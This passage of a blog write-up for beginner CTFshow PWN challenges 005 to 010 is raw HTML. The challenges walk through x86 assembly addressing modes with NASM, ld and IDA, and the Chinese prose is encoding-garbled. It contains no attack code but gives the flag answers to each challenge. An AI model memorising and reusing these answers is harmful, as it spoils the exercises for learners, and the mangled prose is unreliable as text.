</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="k">section</span> <span class="nv">.data</span>
</span></span><span class="line"><span class="cl">    <span class="nf">msg</span> <span class="nv">db</span> <span class="s">&#34;Welcome_to_CTFshow_PWN&#34;</span><span class="p">,</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">section</span> <span class="nv">.text</span>
</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="nv">_start</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nl">_start:</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">; ç«‹å³å¯»å€æ–¹å¼</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="mi">11</span>         <span class="c1">; å°†11èµ‹å€¼ç»™eax</span>
</span></span><span class="line"><span class="cl">    <span class="nf">add</span> <span class="nb">eax</span><span class="p">,</span> <span class="mi">114504</span>     <span class="c1">; eaxåŠ ä¸Š114504</span>
</span></span><span class="line"><span class="cl">    <span class="nf">sub</span> <span class="nb">eax</span><span class="p">,</span> <span class="mi">1</span>          <span class="c1">; eaxå‡å»1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">; å¯„å­˜å™¨å¯»å€æ–¹å¼</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="mh">0x36d</span>      <span class="c1">; å°†0x36dèµ‹å€¼ç»™ebx</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">ebx</span>        <span class="c1">; å°†ebxçš„å€¼èµ‹å€¼ç»™edx</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">; ç›´æ¥å¯»å€æ–¹å¼</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nv">msg</span>      <span class="c1">; å°†msgçš„åœ°å€èµ‹å€¼ç»™ecx</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">; å¯„å­˜å™¨é—´æ¥å¯»å€æ–¹å¼</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">esi</span><span class="p">,</span> <span class="nv">msg</span>        <span class="c1">; å°†msgçš„åœ°å€èµ‹å€¼ç»™esi</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">esi</span><span class="p">]</span>      <span class="c1">; å°†esiæ‰€æŒ‡å‘çš„åœ°å€çš„å€¼èµ‹å€¼ç»™eax</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">; å¯„å­˜å™¨ç›¸å¯¹å¯»å€æ–¹å¼</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nv">msg</span>        <span class="c1">; å°†msgçš„åœ°å€èµ‹å€¼ç»™ecx</span>
</span></span><span class="line"><span class="cl">    <span class="nf">add</span> <span class="nb">ecx</span><span class="p">,</span> <span class="mi">4</span>          <span class="c1">; å°†ecxåŠ ä¸Š4</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ecx</span><span class="p">]</span>      <span class="c1">; å°†ecxæ‰€æŒ‡å‘çš„åœ°å€çš„å€¼èµ‹å€¼ç»™eax</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">; åŸºå€å˜å€å¯»å€æ–¹å¼</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nv">msg</span>        <span class="c1">; å°†msgçš„åœ°å€èµ‹å€¼ç»™ecx</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="mi">2</span>          <span class="c1">; å°†2èµ‹å€¼ç»™edx</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ecx</span> <span class="o">+</span> <span class="nb">edx</span><span class="o">*</span><span class="mi">2</span><span class="p">]</span>  <span class="c1">; å°†ecx+edx*2æ‰€æŒ‡å‘çš„åœ°å€çš„å€¼èµ‹å€¼ç»™eax</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">; ç›¸å¯¹åŸºå€å˜å€å¯»å€æ–¹å¼</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nv">msg</span>        <span class="c1">; å°†msgçš„åœ°å€èµ‹å€¼ç»™ecx</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="mi">1</span>          <span class="c1">; å°†1èµ‹å€¼ç»™edx</span>
</span></span><span class="line"><span class="cl">    <span class="nf">add</span> <span class="nb">ecx</span><span class="p">,</span> <span class="mi">8</span>          <span class="c1">; å°†ecxåŠ ä¸Š8</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ecx</span> <span class="o">+</span> <span class="nb">edx</span><span class="o">*</span><span class="mi">2</span> <span class="o">-</span> <span class="mi">6</span><span class="p">]</span>  <span class="c1">; å°†ecx+edx*2-6æ‰€æŒ‡å‘çš„åœ°å€çš„å€¼èµ‹å€¼ç»™eax</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">; è¾“å‡ºå­—ç¬¦ä¸²</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="mi">4</span>          <span class="c1">; ç³»ç»Ÿè°ƒç”¨å·4ä»£è¡¨è¾“å‡ºå­—ç¬¦ä¸²</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="mi">1</span>          <span class="c1">; æ–‡ä»¶æè¿°ç¬¦1ä»£è¡¨æ ‡å‡†è¾“å‡º</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nv">msg</span>        <span class="c1">; è¦è¾“å‡ºçš„å­—ç¬¦ä¸²çš„åœ°å€</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="mi">22</span>         <span class="c1">; è¦è¾“å‡ºçš„å­—ç¬¦ä¸²çš„é•¿åº¦</span>
</span></span><span class="line"><span class="cl">    <span class="nf">int</span> <span class="mh">0x80</span>            <span class="c1">; è°ƒç”¨ç³»ç»Ÿè°ƒç”¨</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">; é€€å‡ºç¨‹åº</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="mi">1</span>          <span class="c1">; ç³»ç»Ÿè°ƒç”¨å·1ä»£è¡¨é€€å‡ºç¨‹åº</span>
</span></span><span class="line"><span class="cl">    <span class="nf">xor</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">ebx</span>        <span class="c1">; è¿”å›å€¼ä¸º0</span>
</span></span><span class="line"><span class="cl">    <span class="nf">int</span> <span class="mh">0x80</span>            <span class="c1">; è°ƒç”¨ç³»ç»Ÿè°ƒç”¨</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>checksecä¸€ä¸‹è¿™ä¸ªPWNæ–‡ä»¶ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/18.png"
	width="560"
	height="160"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/18_hu_b88e80be1380d264.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/18_hu_edb93148c7d1aae7.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="350"
		data-flex-basis="840px"
	
></p>
<p>ohohè¿™ä¸ªä¿æŠ¤å…¨å…³çš„ï¼IDAçš„x32ä½</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/19.png"
	width="986"
	height="270"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/19_hu_5a1e69eadca2a8dd.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/19_hu_94c08c2f6f98fd2d.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="365"
		data-flex-basis="876px"
	
></p>
<p>è¿™ä¸ªæ²¡mainå‡½æ•°ï¼Œé‚£æˆ‘ä»¬å›çœ‹é‚£æ®µæ±‡ç¼–è¯­è¨€asmï¼Œè¿™æ®µæ±‡ç¼–è¯­è¨€æ›´åƒæ˜¯åœ¨å¸®åŠ©æˆ‘ä»¬äº†è§£æ±‡ç¼–è¯­è¨€çš„é€»è¾‘è¯­æ³•è§„åˆ™çš„ï¼Œåœ¨<a class="link" href="https://expl0rer.top/p/pwn-1/"  target="_blank" rel="noopener"
    >PWN-1</a>æ–‡ç« ä¸­å°±æœ‰è®²è¿‡æ±‡ç¼–è¯­è¨€ï¼Œè¿™é‡Œå°±ç›´æ¥è·³è¿‡è¯¦è§£</p>
<p>è¿™é¢˜å¼€å§‹å°±æœ‰ç‚¹å˜æ ·äº†ï¼Œâ€œWelcome_to_CTFshow.asmâ€è¿™æ–‡ä»¶æ˜¯ä¸€ä¸ªå­˜æ”¾æ±‡ç¼–è¯­è¨€çš„æ–‡æœ¬æ–‡ä»¶ï¼Œéœ€è¦è¿è¡Œä¸€ä¸‹è½¬æ¢æˆåƒexeè¿™æ ·çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œåœ¨PWN-1è®²è¿‡elfæ–‡ä»¶ï¼š</p>
<blockquote class="alert alert-note">
    <blockquote>
<p>å°†æ±‡ç¼–è¯­è¨€ï¼ˆ.asmï¼‰æ–‡ä»¶è½¬æ¢ä¸ºå¯æ‰§è¡Œæ–‡ä»¶ï¼Œéœ€è¦ç»è¿‡<strong>æ±‡ç¼–ï¼ˆAssembleï¼‰</strong> å’Œ<strong>é“¾æ¥ï¼ˆLinkï¼‰</strong> ä¸¤ä¸ªæ ¸å¿ƒæ­¥éª¤.</p>
</blockquote></blockquote>
<p>åœ¨Kali/Linuxä¸Šä¸‹è½½nasmç¼–è¾‘å™¨ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo apt install nasm
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç„¶åä¸‹è½½ldé“¾æ¥å™¨ï¼ˆé€šå¸¸è‡ªå¸¦ï¼‰ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo apt update <span class="o">&amp;&amp;</span> sudo apt install binutils
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ±‡ç¼–è½¬æ¢ï¼šå°† .asm è½¬æ¢ä¸ºç›®æ ‡æ–‡ä»¶ï¼ˆ.obj æˆ– .oï¼‰</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nasm -f elf Welcome_to_CTFshow.asm
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ±‡ç¼–ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ld -m elf_i386 -s -o Welcome_to_CTFshow1 Welcome_to_CTFshow.o
</span></span></code></pre></td></tr></table>
</div>
</div><p>ï¼ˆWelcome_to_CTFshow1æ˜¯å¯æ‰§è¡Œæ–‡ä»¶ï¼‰</p>
<p>æˆ‘çš„å»ºè®®æ±‡ç¼–è½¬æ¢å’Œç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶çš„è¿‡ç¨‹éƒ½åœ¨Kali/Linux/Ubuntuä¸Šï¼Œæ¯”è¾ƒæ–¹ä¾¿ï¼Œwindowsä¸‹è½½æ¯”è¾ƒéº»çƒ¦ã€‚</p>
<p>ç”Ÿæˆè¿™ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ä¹‹åï¼Œç›´æ¥è¿è¡Œå°±èƒ½å¾—åˆ°è¾“å‡ºç»“æœäº†ï¼ŒæŒ‰ç…§é¢˜ç›®è¦æ±‚ï¼ŒåŠ ä¸ª{}åŒ…çš®å»æäº¤å°±å¥½äº†ã€‚</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/20.png"
	width="765"
	height="230"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/20_hu_9d3cd65ccf046d84.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/20_hu_f0e09656aebee87e.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="332"
		data-flex-basis="798px"
	
></p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/21.png"
	width="1040"
	height="295"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/21_hu_96a8674a27a83293.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/21_hu_adca9e8247769340.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="352"
		data-flex-basis="846px"
	
></p>
<h3 id="pwn_006">PWN_006
</h3><p>é¢˜ç›®ï¼šç«‹å³å¯»å€æ–¹å¼ç»“æŸåeaxå¯„å­˜å™¨çš„å€¼ä¸ºï¼Ÿ</p>
<p><a class="link" href="PWN_006%5cWelcome_to_CTFshow" >Welcome_to_CTFshow</a></p>
<p><a class="link" href="PWN_006%5cWelcome_to_CTFshow.asm" >Welcome_to_CTFshow.asm</a></p>
<p>æŒ‰ç…§PWN-005é‚£æ ·å»è½¬æ¢ç”Ÿæˆè¿™ä¸ªå¯æ‰§è¡Œæ–‡ä»¶</p>
<blockquote>
<p>æ±‡ç¼–è½¬æ¢ï¼šå°† .asm è½¬æ¢ä¸ºç›®æ ‡æ–‡ä»¶ï¼ˆ.obj æˆ– .oï¼‰</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nasm -f elf Welcome_to_CTFshow.asm
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ±‡ç¼–ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ld -m elf_i386 -s -o Welcome_to_CTFshow1 Welcome_to_CTFshow.o
</span></span></code></pre></td></tr></table>
</div>
</div><p>ï¼ˆWelcome_to_CTFshow1æ˜¯å¯æ‰§è¡Œæ–‡ä»¶ï¼‰</p>
</blockquote>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/22.png"
	width="618"
	height="155"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/22_hu_38c3a83cb1d6b3d2.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/22_hu_15cc2bc9e2e15087.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="398"
		data-flex-basis="956px"
	
></p>
<p>Welcome_to_CTFshow_PWN???æ˜¯flagï¼Œé”™äº†ï¼Œé¢˜ç›®æ˜¯<strong>ç«‹å³å¯»å€</strong>æ–¹å¼ç»“æŸå<strong>eaxå¯„å­˜å™¨çš„å€¼</strong>ä¸ºï¼Ÿ</p>
<p>é‚£å°±æ˜¯å¾—æŠŠè¿™ä¸ªè½¬æ¢å‡ºçš„å¯æ‰§è¡Œæ–‡ä»¶æ”¾åˆ°IDAä¸Šï¼Œä¸è¿‡ä¹‹å‰è®°å¾—checksecä¸€ä¸‹çœ‹çœ‹æ˜¯x32è¿˜æ˜¯x64ä½å“¦&hellip;</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="c1">; ç«‹å³å¯»å€æ–¹å¼</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="mi">11</span>        <span class="c1">; å°†11èµ‹å€¼ç»™eax</span>
</span></span><span class="line"><span class="cl">    <span class="nf">add</span> <span class="nb">eax</span><span class="p">,</span> <span class="mi">114504</span>    <span class="c1">; eaxåŠ ä¸Š114504</span>
</span></span><span class="line"><span class="cl">    <span class="nf">sub</span> <span class="nb">eax</span><span class="p">,</span> <span class="mi">1</span>         <span class="c1">; eaxå‡å»1</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/23.png"
	width="1153"
	height="151"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/23_hu_d9da713c30313d8.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/23_hu_9162e9b7e00f4ccc.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="763"
		data-flex-basis="1832px"
	
></p>
<p>é‚£å°±åŠ å‡æ³•å’¯ï¼š11+114504-1=114514</p>
<p>ctfshow{114514}</p>
<h3 id="pwn_007">PWN_007
</h3><p>é¢˜ç›®ï¼š<strong>å¯„å­˜å™¨å¯»å€æ–¹å¼</strong>ç»“æŸå<code>edxå¯„å­˜å™¨</code>çš„å€¼ä¸ºï¼Ÿ</p>
<p><a class="link" href="PWN_007%5cWelcome_to_CTFshow" >Welcome_to_CTFshow</a></p>
<p><a class="link" href="PWN_007%5cWelcome_to_CTFshow.asm" >Welcome_to_CTFshow.asm</a></p>
<p>æŒ‰ç…§ä¸Šè¿°æ–¹æ³•å»å¾—å‡ºå¯æ‰§è¡Œæ–‡ä»¶ï¼Œæ”¾å…¥IDAï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/24.png"
	width="985"
	height="95"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/24_hu_92bd39fab506337a.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/24_hu_75d2f4fa5f54ead5.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="1036"
		data-flex-basis="2488px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="c1">; å¯„å­˜å™¨å¯»å€æ–¹å¼</span>
</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="mh">0x36d</span> <span class="c1">; å°†0x36dèµ‹å€¼ç»™ebx</span>
</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">ebx</span> <span class="c1">; å°†ebxçš„å€¼èµ‹å€¼ç»™edx</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ‰€ä»¥ctfshow{0x36D}</p>
<h3 id="pwn_008">PWN_008
</h3><p>é¢˜ç›®ï¼šç›´æ¥å¯»å€æ–¹å¼ç»“æŸåecxå¯„å­˜å™¨çš„å€¼ä¸ºï¼Ÿ</p>
<p><a class="link" href="..%5c..%5c..%5c..%5c..%5cLegion22%5cCTF-CTFshow%e7%a7%81%e6%95%99-PWN%5c02_%e5%89%8d%e7%bd%ae%e5%9f%ba%e7%a1%80%5cpwn_008%5cWelcome_to_CTFshow" >Welcome_to_CTFshow</a></p>
<p><a class="link" href="..%5c..%5c..%5c..%5c..%5cLegion22%5cCTF-CTFshow%e7%a7%81%e6%95%99-PWN%5c02_%e5%89%8d%e7%bd%ae%e5%9f%ba%e7%a1%80%5cpwn_008%5cWelcome_to_CTFshow.asm" >Welcome_to_CTFshow.asm</a></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="c1">; ç›´æ¥å¯»å€æ–¹å¼</span>
</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="p">[</span><span class="nv">msg</span><span class="p">]</span> <span class="c1">; å°†msgçš„åœ°å€èµ‹å€¼ç»™ecx</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å½“ä½ ç¼–è¯‘åå‘ç°æ‰¾ä¸åˆ°åœ°å€[msg]ï¼Œç„¶åæˆ‘ä»¬å€’å›æ¥æ‰¾é¢˜ç›®çš„Welcome_to_CTFshowæ–‡ä»¶ï¼Œç”¨IDAï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/25.png"
	width="721"
	height="25"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/25_hu_5372def4240b6f53.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/25_hu_1d2087bdde9824cc.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="2884"
		data-flex-basis="6921px"
	
></p>
<p>æ•…flag:ctfshow{0x80490E8}</p>
<p>å…¶å®ä¸ç”¨å»è¿›è¡Œç¼–è¯‘çš„ï¼Œåœ¨é¢˜ç›®ç»™çš„æ–‡ä»¶å°±èƒ½åšï¼Œç¼–è¯‘å‡ºæ¥çš„å…¶å®å°±æ˜¯é¢˜ç›®ç»™çš„æ–‡ä»¶ã€‚</p>
<h3 id="pwn_009">PWN_009
</h3><p>é¢˜ç›®ï¼š<strong>å¯„å­˜å™¨é—´æ¥å¯»å€</strong>æ–¹å¼ç»“æŸåeaxå¯„å­˜å™¨çš„å€¼ä¸ºï¼Ÿ</p>
<p><a class="link" href="..%5c..%5c..%5c..%5c..%5cLegion22%5cCTF-CTFshow%e7%a7%81%e6%95%99-PWN%5c02_%e5%89%8d%e7%bd%ae%e5%9f%ba%e7%a1%80%5cpwn_009%5cWelcome_to_CTFshow" >Welcome_to_CTFshow</a></p>
<p><a class="link" href="..%5c..%5c..%5c..%5c..%5cLegion22%5cCTF-CTFshow%e7%a7%81%e6%95%99-PWN%5c02_%e5%89%8d%e7%bd%ae%e5%9f%ba%e7%a1%80%5cpwn_009%5cWelcome_to_CTFshow.asm" >Welcome_to_CTFshow.asm</a></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="c1">; å¯„å­˜å™¨é—´æ¥å¯»å€æ–¹å¼</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">esi</span><span class="p">,</span> <span class="nv">msg</span>        <span class="c1">; å°†msgçš„åœ°å€èµ‹å€¼ç»™esi</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">esi</span><span class="p">]</span>      <span class="c1">; å°†esiæ‰€æŒ‡å‘çš„åœ°å€çš„å€¼èµ‹å€¼ç»™eax</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/26.png"
	width="650"
	height="175"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/26_hu_db95f2c70775bfb6.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/26_hu_6e7577b16306137d.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="371"
		data-flex-basis="891px"
	
></p>
<p>ä¸æ˜¯80490E8å“ˆåˆ«è¢«è¯¯å¯¼äº†ï¼Œè¿™æ˜¯<strong>è™šæ‹Ÿåœ°å€</strong>å“¦</p>
<p>ç‚¹å‡»è·Ÿè¿›ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/27.png"
	width="659"
	height="25"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/27_hu_2f879014412c83d2.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/27_hu_a9abfa63d7183e7a.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="2636"
		data-flex-basis="6326px"
	
></p>
<p><strong><code>dd 636C6557h</code></strong>ï¼š<code>dd</code> æ˜¯æ±‡ç¼–æŒ‡ä»¤ä¸­çš„ä¼ªæ“ä½œç¬¦ï¼Œæ„ä¸º â€œå®šä¹‰åŒå­—ï¼ˆdefine double wordï¼‰â€ï¼Œè¡¨ç¤ºåœ¨å½“å‰åœ°å€å¤„å­˜æ”¾ä¸€ä¸ª 4 å­—èŠ‚çš„æ•°å€¼ã€‚è¿™é‡Œå­˜æ”¾çš„æ•°å€¼æ˜¯ <code>636C6557h</code>ï¼ˆåå…­è¿›åˆ¶ï¼‰ã€‚</p>
<p>flag:ctfshow{0x636C6557}</p>
<h3 id="pwn_010">PWN_010
</h3><p>é¢˜ç›®ï¼š<strong>å¯„å­˜å™¨ç›¸å¯¹å¯»å€</strong>æ–¹å¼ç»“æŸåeaxå¯„å­˜å™¨çš„å€¼ä¸ºï¼Ÿ</p>
<p><a class="link" href="PWN_010%5cWelcome_to_CTFshow" >Welcome_to_CTFshow</a></p>
<p><a class="link" href="PWN_010%5cWelcome_to_CTFshow.asm" >Welcome_to_CTFshow.asm</a></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="c1">; å¯„å­˜å™¨ç›¸å¯¹å¯»å€æ–¹å¼</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nv">msg</span>        <span class="c1">; å°†msgçš„åœ°å€èµ‹å€¼ç»™ecx</span>
</span></span><span class="line"><span class="cl">    <span class="nf">add</span> <span class="nb">ecx</span><span class="p">,</span> <span class="mi">4</span>          <span class="c1">; å°†ecxåŠ ä¸Š4</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ecx</span><span class="p">]</span>      <span class="c1">; å°†ecxæ‰€æŒ‡å‘çš„åœ°å€çš„å€¼èµ‹å€¼ç»™eax</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/28.png"
	width="845"
	height="154"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/28_hu_e162f950e4f701a0.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/28_hu_fc64a86acf95c0c7.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="548"
		data-flex-basis="1316px"
	
></p>
<p>ç„¶åæˆ‘ä»¬è·Ÿè¿›çœ‹ä¸€ä¸‹åœ°å€ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/29.png"
	width="770"
	height="110"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/29_hu_8e18458aaf2629b0.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/29_hu_265416ee1eefcac9.png 1024w"
	loading="lazy"
	
